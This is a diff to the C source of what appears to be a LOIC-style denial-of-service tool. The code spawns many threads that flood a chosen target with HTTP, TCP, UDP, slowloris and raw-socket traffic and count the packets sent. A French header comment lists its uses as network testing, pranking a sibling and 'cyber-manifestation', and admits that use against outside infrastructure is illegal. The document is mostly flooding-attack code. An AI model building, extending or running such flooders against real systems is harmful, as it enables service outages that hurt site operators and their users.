@@ -1,28 +1,29 @@
+/*
+
+ NOTE :
+ Pourquoi ce programme ?
+
+ 1. Je voulais apprendre le C.
+ 2. GTK, je connaissais pas, mais on m'en avais dit du bien.
+ 3. Très peu de programmes << avancés >> possèdent des interfaces utilisateurs. Le but est de rendre accessible de type de programmes aux newbies.
+
+
+ Utilité ?
+
+ 1. Tests de sécurité sur votre réseau.
+ 2. Faire chier votre petit frère / petite soeur.
+ 3. Faire de la cyber-manifestation (pour le jour où ça sera légalisé, ce qui n'est pas le cas en ce jour du 13 Aout 2011)
+ (car, oui, l'utilisation de l'outil sur des infrastructures extérieures est illégale)
+
+
+ */
+
 #include "canon.h"
 
 pthread_t threads[1024]; // Lazors
-int nbPacketsSent[1024];
 
 pthread_mutex_t ca_mutex = PTHREAD_MUTEX_INITIALIZER;
 
-
-int getNbPacketsSent(int nt) {
-
-    pthread_mutex_lock(&ca_mutex);
-        int nb = nbPacketsSent[nt];
-    pthread_mutex_unlock(&ca_mutex);
-
-    return nb;
-}
-
-int setNbPacketsSent(int nt, int nbp) {
-
-    pthread_mutex_lock(&ca_mutex);
-        nbPacketsSent[nt] = nbp;
-    pthread_mutex_unlock(&ca_mutex);
-
-    return TRUE;
-}
 
 int stop_canon() {
 
@@ -36,48 +37,52 @@ int stop_canon() {
 
 int start_canon() {
 
-
     if ( getStatus() == READY ) {
 
         if ( strcmp(getTarget(),"") != 0 ) {
 
-            int i;
-            for ( i=0; i < getNbThreads(); i++ ) {
-                pthread_create(&threads[i],NULL,(void*)fire,(void*)i);
-            }
+            if ( isHostname( getTarget() )) {
 
-            /* If one or several threads running */
-            if (i > 0)
-                setStatus(FIRING);
+                int i;
+                for ( i=0; i < getNbThreads(); i++ ) {
+                    pthread_create(&threads[i],NULL,(void*)fire,(void*)i);
+                }
 
-            pthread_t thread_timeout;
-            pthread_create(&thread_timeout,NULL,(void*)oversee_timeout,(void*)getTimeout());
+                /* If one or several threads running */
+                if (i > 0)
+                    setStatus(FIRING);
 
-
-            int total_packets_sent = 0;
-
-            for ( i=0; i < getNbThreads(); i++ ) {
-                int packets_sent = 0;
-                pthread_join(threads[i],(void*)&packets_sent);
-                printf("%d ps\n",packets_sent);
-                total_packets_sent += packets_sent;
-            }
+                pthread_t thread_timeout;
+                pthread_create(&thread_timeout,NULL,(void*)oversee_timeout,(void*)getTimeout());
 
 
-            setStatus(READY);
-            printf("%d packets sent !\n",total_packets_sent);
+                int total_packets_sent = 0;
 
-            return 0;
+                for ( i=0; i < getNbThreads(); i++ ) {
+                    int packets_sent = 0;
+                    pthread_join(threads[i],(void*)&packets_sent);
+                    printf("%d ps\n",packets_sent);
+                    total_packets_sent += packets_sent;
+                }
 
+
+                setStatus(READY);
+                printf("%d packets sent !\n",total_packets_sent);
+
+                return 0;
             }
             else
-                loic_error("You have not selected a target", GRAVE);
+                return E_UNKNOWN_HOST;
+
         }
         else
-            loic_error("Not ready", GRAVE);
+            return E_NO_HOST;
+    }
+    else
+       return E_BUSY;
 
 
-    return 2;
+    return -1;
 }
 
 int oversee_timeout(int time) {
@@ -85,18 +90,19 @@ int oversee_timeout(int time) {
     float passed = 0;
 
     while ( passed < time ) {
-        sleep_millis(100);
+        sleep_millis(50);
 
         #ifdef GTK_GUI
             refresh_infos();
         #endif
 
 
-        passed += 0.1;
+        passed += 0.05;
     }
 
     if ( getStatus() == FIRING ) {
         setStatus(TIMEOUT);
+        printf("TIMEOUT !!!\n\n\n");
     }
 
     return 0;
@@ -166,6 +172,10 @@ int http_fire(int id) {
             char received_data[1024];
             s_recv(s,received_data,sizeof(received_data));
             printf("%s\n",received_data);
+        }
+
+        if ( packet_count % 15 == 0 ) {
+            setNbPacketsSent(id, packet_count);
         }
 
         sleep_millis(delay);
@@ -283,6 +293,7 @@ int udp_fire(int id) {
 
         int n;
 
+
         if ( isWaitEnabled() == TRUE ) {
             char received_data[1024];
             if( (n = recvfrom((SOCKET)s, received_data, sizeof(received_data) - 1, 0, (SOCKADDR*)&to, &tosize)) < 0 ) {
@@ -292,7 +303,9 @@ int udp_fire(int id) {
 
          printf("%d --> %d\n",id,packet_count);
 
-         setNbPacketsSent(id, packet_count);
+        if ( packet_count % 15 == 0 ) {
+            setNbPacketsSent(id, packet_count);
+        }
 
 
          sleep_millis(delay);
@@ -352,6 +365,10 @@ int tcp_fire(int id) {
             s_recv(s,received_data,sizeof(received_data));
 
             printf("%s\n",received_data);
+        }
+
+        if ( packet_count % 15 == 0 ) {
+            setNbPacketsSent(id, packet_count);
         }
 
         sleep_millis(delay);
@@ -423,6 +440,10 @@ int slowloris_fire(int id) {
 
         }
 
+        if ( socket_counter % 15 == 0 ) {
+            setNbPacketsSent(id, socket_counter);
+        }
+
         sleep_millis(delay);
     }
 
@@ -474,6 +495,10 @@ int raw_test(int id) {
         }
 
         sleep_millis(delay);
+    }
+
+    if ( packet_count % 15 == 0 ) {
+        setNbPacketsSent(id, packet_count);
     }
 
     closesocket(s);
